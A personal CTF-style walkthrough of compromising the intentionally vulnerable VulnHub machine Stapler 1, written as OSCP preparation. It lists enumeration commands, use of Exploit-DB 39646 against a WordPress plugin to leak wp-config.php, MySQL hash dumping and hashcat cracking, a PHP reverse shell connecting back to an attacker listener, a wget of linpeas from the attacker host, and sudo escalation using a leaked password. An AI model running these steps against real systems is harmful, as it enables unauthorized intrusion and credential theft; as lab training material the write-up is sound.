[Stapler 1](https://www.vulnhub.com/entry/stapler-1,150/) is a vulnerable machine found on the [NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.

First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used **netdiscover -i eth0** until I came across the IP of this machine.

Next, I ran **threader3000** to enumerate the open ports and let it run it's recommended nmap scan.

![Stapler 1 nmap1](/assets/img/Stapler3.png)

![Stapler 1 nmap2](/assets/img/Stapler4.png)

It appeared that FTP access was open to the anonymous user, so I connected with **ftp [machine ip]** and entered the user of **anonymous** and a blank password. Once connected, I ran **ls** to list the directory contents, which had a note file present. I ran **get note** to download this note file locally.

![Stapler 1 ftp](/assets/img/Stapler5.png)

Next, I reviewed the note's content with **cat note**.

![Stapler 1 cat note](/assets/img/Stapler6.png)

Next, I ran **nmap --script smb-enum-shares -p 139 [machine ip]** to enumerate the SMB shares.

![Stapler 1 nmap enumerate smb shares](/assets/img/Stapler7.png)

It appears that the anonymous user has read access to **\kathy** and read/write access to **\tmp**. I ran **smbclient \\\\\\\\[machine ip]\\\\kathy -U ""** to connect to kathy's share. I then ran **ls**, which showed directories of **kathy_stuff** and **backup**. I then ran **cd kathy_stuff** followed by **ls** and saw that there is a file named **todo-list.txt** present. I ran **mget *** to download this file. I then ran **cd ..** followed by **cd backup** and another **ls**. This showed two files present, **vsftpd.conf** and **wordpress-4.tar.gz**. I then ran **mget *** to download these files as well.

![Stapler 1 smbclient \kathy](/assets/img/Stapler8.png)

None of these files had anything important in them, as the ftp/WordPress files were default files, and the todo-list.txt didn't really have anything useful in it either. Next, I looked at the webpage on port 80, which had nothing present on it, I then looked at the website hosted on **port 12380**, which had a coming soon page present. I decided to run **nikto -host http://[machine ip]:12380** to enumerate this host. It found that the site uses SSL and two entries in the robots.txt file on the HTTPS site: **/admin112233/** and **/blogblog/**.

![Stapler 1 nikto](/assets/img/Stapler9.png)

Looking at the **/admin112233** directory redirected to another website mentioning XSS so I made note of that in case it was a hint needed for later. Next, I navigated to **https://[machine ip]:12380/blogblog/** and it appeared to be a WordPress blog.

![Stapler 1 WordPress site](/assets/img/Stapler10.png)

Next I ran **wpscan --url https://[machine ip]:12380/blogblog --disable-tls-checks**. This uncovered the fact that the uploads directory lists its contents.

![Stapler 1 wpscan 1](/assets/img/Stapler11.png)

![Stapler 1 wpscan 2](/assets/img/Stapler12.png)

Let's go to **https://[machine ip]:12380/blogblog/wp-content/uploads**. It appears that nothing is in this directory, but we can go up to its parent directory.

![Stapler 1 /blogblog/wp-content/uploads](/assets/img/Stapler13.png)

Navigating up a directory reveals a plugins directory, let's see what is in there.

![Stapler 1 plugins directory](/assets/img/Stapler14.png)

It appears that there are several plugins here. Let's take a look at the **advanced-vdieo-embed-embed-videos-or-playlists** directory.

![Stapler 1 plugin directory](/assets/img/Stapler15.png)

From here, let's look at the **readme.txt** file.

![Stapler 1 readme.txt](/assets/img/Stapler16.png)

It appears that this is version 1.0 of this plugin, which has an exploit available. A quick Google search reveals exploit ID **39646**.

![Stapler 1 exploit-db 39646](/assets/img/Stapler17.png)

From your attacker PC, run **searchsploit 39646**, which should return the results shown below.

![Stapler 1 searchsploit](/assets/img/Stapler18.png)

Let's run **searchsploit - m 39646** to copy this exploit to our current directory.

![Stapler 1 searchsploit -m](/assets/img/Stapler19.png)

I then opened the exploit it an editor and modified the **url** variable to point to **"https://[machine ip]:12380/blogblog"** and saved the exploit.

![Stapler 1 modify 39646 exploit](/assets/img/Stapler20.png)

![Stapler 1 exploit failed](/assets/img/Stapler21.png)

The exploit seems to have failed because it could not verify the certificate. I decided to review the code of the exploit again.

![Stapler 1 exploit code](/assets/img/Stapler22.png)

This is where I found the highlighted section above. I modified it by replacing the **' +str(randomID) + '** portion with several 7s (I don't think the value matters) and then copied this URL string (as shown below). This will save the wp-config.php file to a .jpeg file.

![Stapler 1 exploit URL](/assets/img/Stapler23.png)

I then copied/pasted this value into my browser to run this exploit code.

![Stapler 1 new post](/assets/img/Stapler24.pn

After running it, I went to the main webpage of the website as directed by the exploit. It created a post named **7777777** (which is the title we modified in the exploit above). It also created an image named **[random number].jpg**)

![Stapler 1 /blogblog/wp-content/uploads](/assets/img/Stapler25.png)

I navigated to **/blogblog/wp-content/uploads** and the jpeg file was present there. I saved it locally as **[file name].txt**.

![Stapler 1 save jpeg](/assets/img/Stapler26.png)

I then opened the file with Mousepad on my attacker PC

![Stapler 1 wp-config.php 1](/assets/img/Stapler27.png)

![Stapler 1 wp-config.php 2](/assets/img/Stapler28.png)

Scrolling through the config led us to the login credentials for MySQL. This port was also accessible externally based on the nmap scan earlier. Let's run **mysql -u root -h [machine ip] -p** and enter the password above when prompted.

![Stapler 1 remote mysql login](/assets/img/Stapler29.png)

Let's run **show databases;** to list the databases on the server and then use **use wordpress;** to select the WordPress table. Next, let's run **show tables;** to list the tables in the database.

![Stapler 1 enumerate mysql 1](/assets/img/Stapler30.png)

Let's next run **select * from wp_users;** and you will get a huge list of users/password hashes as shown below.

![Stapler 1 enumerate mysql 2](/assets/img/Stapler31.png)

Let's slightly modify our query to **select user_login,user_pass from wp_users;** to only get the usernames and password hashes.

![Stapler 1 mysql wp_user modified query](/assets/img/Stapler32.png)

Next, let's copy this and save the hashes only to a text file on your attacker pc. I saved it as **wphashes.txt**.

![Stapler 1 wordpress hashes](/assets/img/Stapler33.png)

Let's run hashcat to crack these hashes with **hashcat -m 4000 -a 0 wphashes.txt /usr/share/wordlists/rockyou.txt**.

![Stapler 1 hashcat](/assets/img/Stapler34.png)

After a bit, it cracked a few of the passwords.

![Stapler 1 hashcat results](/assets/img/Stapler35.png)

I lined these hashes/passwords up with the list we had copied over originally and was able to login as 4 different users, but none of them were an administrator. I then remembered that usually the first user listed was the admin, so I modified wp-hashes.txt to only have that hash present and reran **hashcat -m 4000 -a 0 wphashes.txt /usr/share/wordlists/rockyou.txt**. After a few minutes, it cracked this user's (john) password.

![Stapler 1 hashcat john password crack](/assets/img/Stapler36.png)

Below are a list of the users and passwords that were cracked. I tried to SSH into the target machine with all of these usernames/passwords, but none were successful. 

![Stapler 1 wordpress users/passwords](/assets/img/Stapler37.png)

I then logged in with John's credentials for WordPress, and he is an administrator. I clicked on **Plugins, Add New** and then **Browse** so I could upload a [reverse PHP shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). I modified this shell to point to my attacker PC's IP address and a port of my choosing (4444). Once modified, I saved it and uploaded it.

![Stapler 1 Wordpress Plugins](/assets/img/Stapler38.png)

The screen below came up after uploading the PHP shell. I ignored this as we do not need to configure anything.

![Stapler 1 upload complete](/assets/img/Stapler39.png)

From my attacker PC, I started a nc listener with **nc -nvlp 4444** (as this was the port I had specified in the reverse shell to connect on).

![Stapler 1 nc listener](/assets/img/Stapler40.png)

I knew that files typically got uploaded to **/wp-content/uploads** under the base WordPress site URL, so I navigated there. We could see a directory listing, which had the reverse shell we just uploaded. I clicked on this file to execute the reverse shell.

![Stapler 1 /blogblog/wp-content/uploads](/assets/img/Stapler41.png)

At this point we finally had a foothold. Running **whoami** revealed we have access as user **www-data**

![Stapler 1 foothold www-data](/assets/img/Stapler42.png)

Next, I upgraded my shell with **python -c 'import pty; pty.spawn("/bin/sh")'**.

![Stapler 1 upgrade shell Python](/assets/img/Stapler43.png)

Next, I served up a python http server on my attacker PC with **python3 -m http.server** so we could retrieve linpeas.sh to enumerate this box further. From the initial foothold, I ran **cd /tmp** followed by **wget http://[attacker ip]:8000/linpeas.sh** and then made it executable with **chmod +x linpeas.sh**.

![Stapler 1 cd /tmp wget linpeas.sh](/assets/img/Stapler44.png)

I then ran linpeas.sh with **./linpeas.sh** and reviewed the results.

![Stapler 1 linepeas.sh 1](/assets/img/Stapler45.png)

![Stapler 1 linepeas.sh 2](/assets/img/Stapler46.png)

![Stapler 1 linepeas.sh 3](/assets/img/Stapler47.png)

The Linux kernel seemed exploitable based on linpeas, and a quick look at searchsploit confirmed several potential exploits that could work. However, before digging into each of those, I noticed that **peter** was a member of the **sudo** group and JKanode's **.bash_history** file had an ssh password present. I ran **su peter** and entered the password found above (**JZQuyIN5**) and now I had access as peter. I was then prompted with setting up Z Shell, so I selected options **1** followed by **0** to complete setup.

![Stapler 1 su peter z shell 1](/assets/img/Stapler48.png)

![Stapler 1 su peter z shell 2](/assets/img/Stapler49.png)

Next, I ran **sudo -l** and it appears that peter can run anything as root. 

![Stapler 1 sudo -l](/assets/img/Stapler50.png)

I then ran **sudo su** followed by **whoami** to confirm I had root access. Next, I ran **cd /root** followed by **ls** and there is a **flag.txt** file present. I ran **cat flag.txt** to get the root flag and finish this box.
